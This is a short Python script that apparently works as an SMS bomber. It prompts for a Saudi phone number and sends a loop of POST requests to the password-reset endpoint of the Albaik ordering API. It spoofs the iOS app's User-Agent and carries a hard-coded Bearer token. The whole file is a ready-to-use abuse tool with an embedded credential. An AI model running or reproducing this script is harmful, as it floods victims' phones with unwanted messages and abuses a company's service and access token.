import requests
import json

phone = input("phone number: ").strip()

# Set the URL and data for the POST request
url = 'https://ordering.albaikcloud.com/api/v1/passwords'
data = { "password": { "telephone": "+966" + phone } }
headers = {
    'Content-Type': 'application/json',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'User-Agent': 'ios/6.9.501 (com.albaik.customer; iPhone 13 Pro; 16.3.1)',
    'Accept-Language': 'ar',
    'Authorization': 'Bearer RqaU6d9BjYt5ibrbLjq9xuCqBDECTNH7',
    'Content-Length': str(len(json.dumps(data)))
}

# Make the POST request multiple times (adjust '10' to the desired number of requests)
for index in range(10):
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        print(f"\rRequest {index + 1} sent successfully!", end="")
    else:
        print(f"\rRequest {index + 1} failed with response code: {response.status_code}", end="")
